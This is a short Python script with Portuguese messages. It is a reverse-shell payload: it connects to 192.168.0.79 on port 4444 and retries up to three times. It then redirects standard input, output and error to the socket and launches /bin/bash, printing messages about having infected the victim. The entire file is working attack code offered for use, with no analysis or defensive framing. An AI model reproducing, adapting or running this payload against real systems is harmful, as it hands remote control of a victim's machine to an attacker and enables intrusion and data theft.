import socket
import os
import subprocess
import time


def mensagem_payload():
    print("[+]Payload executado!")              
    time.sleep(1)
    print("[+]Shell Iniciado!")


def mensagem_erro():
    print("[+]Algo deu errado ao tentar infectar a vitima!")
    time.sleep(0.7)
    print("[+]Encerrado payload!")
    time.sleep(1)


def main(host , port):
    for attempt in range(3):
        try:
            with socket.socket(
                socket.AF_INET, 
                socket.SOCK_STREAM) as s:
                s.connect((host , port))


                sock = s.fileno()
                os.dup2(sock , 0)
                os.dup2(sock , 1)
                os.dup2(sock , 2)
                

                mensagem_payload()
                subprocess.run([
                    "/bin/bash",
                ])
                s.close()
                break


        except (ConnectionAbortedError , ConnectionError, ConnectionRefusedError, ConnectionResetError):
            print(f"{attempt+1}/3: Sem sucesso!")
            time.sleep(1)
        except (os.error , subprocess.SubprocessError):
            continue
        if attempt == 2: 
            mensagem_erro()
            break


if __name__ == "__main__":
    host = "192.168.0.79"
    port = 4444
    main(host , port)
